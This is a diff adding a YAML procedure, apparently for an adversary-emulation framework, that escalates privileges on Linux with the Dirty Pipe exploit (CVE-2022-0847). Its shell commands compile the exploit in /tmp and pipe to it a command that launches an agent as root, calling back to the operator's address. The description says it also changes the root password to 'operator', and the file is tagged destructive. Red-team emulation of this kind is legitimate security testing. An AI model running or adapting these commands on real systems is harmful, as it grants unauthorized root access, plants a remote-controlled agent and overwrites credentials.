@@ -1,0 +1,25 @@
+id: 894a2682-9023-4956-b6fd-47200759bd2c
+name: Spawn elevated Pneuma via CVE-2022-0847
+description: Compiles and executes a local privilege escalation exploit (CVE-2022-0847) to spawn a root shell and changes the root password to "operator".
+tactic: privilege-escalation
+technique:
+  id: T1068
+  name: 'Exploitation for Privilege Escalation'
+platforms:
+  linux:
+    sh:
+      command: |-    
+        cp "./dirtypipe.c" /tmp/dirtypipe.c  
+        gcc dirtypipe.c -o /tmp/dirtypipe 
+        chmod +x /tmp/dirtypipe        
+        echo 'nohup #{agent.location} -address #{operator.tcp} -range elevated >/dev/null 2>&1 &' | /tmp/dirtypipe payload: '#{operator.payloads}/CVE-2022-0847/dirtypipe.c'
+metadata:
+  authors:
+    - VVX7
+  chains:
+    - Dirty Pipe (CVE-2022-0847)
+  references:
+    - https://dirtypipe.cm4all.com/
+    - https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
+  tags:
+    - destructive
